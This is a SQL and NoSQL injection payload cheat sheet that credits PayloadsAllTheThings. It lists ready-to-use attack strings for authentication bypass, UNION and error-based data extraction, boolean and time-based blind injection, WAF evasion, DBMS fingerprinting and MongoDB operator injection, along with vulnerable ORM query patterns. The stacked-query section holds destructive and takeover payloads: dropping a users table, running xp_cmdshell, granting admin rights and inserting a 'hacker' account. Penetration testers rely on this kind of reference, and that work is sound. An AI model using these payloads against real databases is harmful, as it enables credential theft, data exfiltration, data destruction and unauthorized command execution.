# SQL Injection Payloads

> Source: PayloadsAllTheThings — SQL Injection

## Authentication Bypass (Top 20)

```sql
' OR '1'='1'--
' or 1=1 limit 1 --
admin' OR '1'='1'--
' OR '1'='1
' or '1'='1' /*
' or 1=1 #
' or 1=1 /*
') or ('1'='1
') or ('1'='1'--
admin'--
admin' #
admin'/*
' or 'a'='a
" or "a"="a
' or 1=1 --
1 or 1=1
1' or '1'='1
') OR 1=1--
' OR '1'='1'/*
admin' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'--
```

## UNION-Based Injection

### Column Enumeration

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 10--
```

### MySQL Data Extraction

```sql
' UNION SELECT version(),database()--
' UNION SELECT table_name,column_name FROM information_schema.columns--
' UNION SELECT username,password FROM users--
' UNION SELECT CONCAT(user,':',password),3 FROM mysql.user--
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
```

### PostgreSQL Data Extraction

```sql
' UNION SELECT current_user,current_database()--
' UNION SELECT version(),inet_client_addr()--
' UNION SELECT table_name,column_name FROM information_schema.columns--
' UNION SELECT usename,usesuper FROM pg_user--
```

### MSSQL Data Extraction

```sql
' UNION SELECT @@version,@@servername--
' UNION SELECT name,xtype FROM sysobjects--
' UNION SELECT table_name,column_name FROM information_schema.columns--
```

### Oracle Data Extraction

```sql
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT username,account_status FROM dba_users--
' UNION SELECT table_name,column_name FROM user_tab_columns--
```

### SQLite Data Extraction

```sql
' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--
' UNION SELECT tbl_name,sql FROM sqlite_master--
```

## Error-Based Injection

### MySQL

```sql
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--
```

### PostgreSQL

```sql
' AND CAST((SELECT version()) as numeric)--
' AND 1=CAST((SELECT version()) as int)--
```

### MSSQL

```sql
' AND CONVERT(int,(SELECT @@version))--
' AND 1=CAST((SELECT @@servername) as int)--
```

### Oracle

```sql
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version))--
' AND EXTRACTVALUE(1,CONCAT('~',(SELECT banner FROM v$version)))--
```

## Blind Injection — Boolean-Based

```sql
-- MySQL
1 AND 1=1 --          -- true condition
1 AND 1=2 --          -- false condition
1 AND LENGTH(database())=5 --
1 AND SUBSTRING(database(),1,1)='a' --
1 AND ASCII(SUBSTRING(database(),1,1))>100 --

-- PostgreSQL
1 AND LENGTH(current_user)=10 --
1 AND SUBSTRING(current_user,1,1)='p' --
```

## Blind Injection — Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(user(),1,1))>100,SLEEP(5),0)--
' AND IF(SUBSTRING(VERSION(),1,1)='5',BENCHMARK(1000000,MD5(1)),0)--

-- PostgreSQL
' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND CASE WHEN ASCII(SUBSTRING(current_user,1,1))>100 THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
' AND WAITFOR DELAY '00:00:05'--
' AND IF 1=1 WAITFOR DELAY '00:00:05'--

-- SQLite
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END--
```

## Stacked Queries

```sql
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--
'; UPDATE users SET admin=1--
'; INSERT INTO admin VALUES('hacker','password')--
'; SELECT * INTO OUTFILE '/tmp/output.txt' FROM users--
```

## WAF Bypass Techniques

### Comment Injection

```sql
1/*comment*/AND/**/1=1/**/--
1/*!12345UNION*//*!12345SELECT*/1--
1'/*!50000UNION*/ /*!50000SELECT*/ 1,2,version()--
```

### Whitespace Alternatives (URL-Encoded)

```
%09  (tab)
%0A  (line feed)
%0B  (vertical tab)
%0C  (form feed)
%0D  (carriage return)
%A0  (non-breaking space)
```

### Case Alternation

```sql
uNiOn SeLeCt
UnIoN/**/aLl/**/SeLeCt
```

### Operator Substitution

```sql
AND  ->  &&
OR   ->  ||
=    ->  LIKE / REGEXP / BETWEEN
>    ->  NOT BETWEEN 0 AND X
WHERE -> HAVING
```

### Parenthesis Grouping

```sql
(1)and(1)=(1)--
(1)or(1)=(1)--
```

## DBMS Fingerprinting

```sql
-- MySQL
conv('a',16,2)=conv('a',16,2)
connection_id()=connection_id()

-- MSSQL
@@CONNECTIONS=@@CONNECTIONS

-- PostgreSQL
5::int=5
pg_client_encoding()=pg_client_encoding()

-- SQLite
sqlite_version()=sqlite_version()

-- Oracle
ROWNUM=ROWNUM
```

## NoSQL Injection (MongoDB)

```json
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// URL-encoded
username[$ne]=x&password[$ne]=x
login[$regex]=a.*&pass[$ne]=lol

// Data extraction via $regex
{"username": "admin", "password": {"$regex": "^m"}}
{"username": "admin", "password": {"$regex": "^md"}}

// $where injection
{"$where": "this.username == 'admin'"}
```

## ORM Injection Patterns

```python
# SQLAlchemy (Python) — raw query in filter
User.query.filter("username='" + input + "'")

# ActiveRecord (Ruby) — string interpolation
User.where("name = '#{params[:name]}'")

# Sequelize (Node.js) — operator injection
{ where: { id: { [Op.gt]: 0 } } }

# Hibernate (Java) — HQL injection
"FROM User WHERE name = '" + input + "'"
```
